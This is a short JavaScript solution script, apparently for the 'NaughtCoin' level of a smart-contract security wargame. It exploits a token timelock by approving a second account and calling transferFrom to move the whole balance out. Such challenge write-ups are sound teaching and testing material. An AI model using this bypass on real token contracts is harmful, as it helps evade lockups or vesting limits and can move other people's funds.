const level15 = async (web3, NaughtCoin) => {

    const targetAddress = '0xdff8891a932c52c294047b0d5c325e2b0f08d29d';
    console.log(`Exploiting Level15 target ${targetAddress}...`);

    console.log('Retrieving target contract...');
    const target = await NaughtCoin.at(targetAddress);

    console.log('Retrieving current address...');
    const player = (await web3.eth.getAccounts())[0];

    console.log('Retrieving secondary address...');
    const secondary = (await web3.eth.getAccounts())[1];

    console.log('Retrieving current balance...');
    const balance = await target.balanceOf(player);

    console.log('Assigning tokens to secondary address...');
    await target.approve(secondary, balance, {from: player});

    console.log('Withdrawing tokens to secondary address...');
    await target.transferFrom(player, secondary, balance, {from: secondary});
};

module.exports = level15;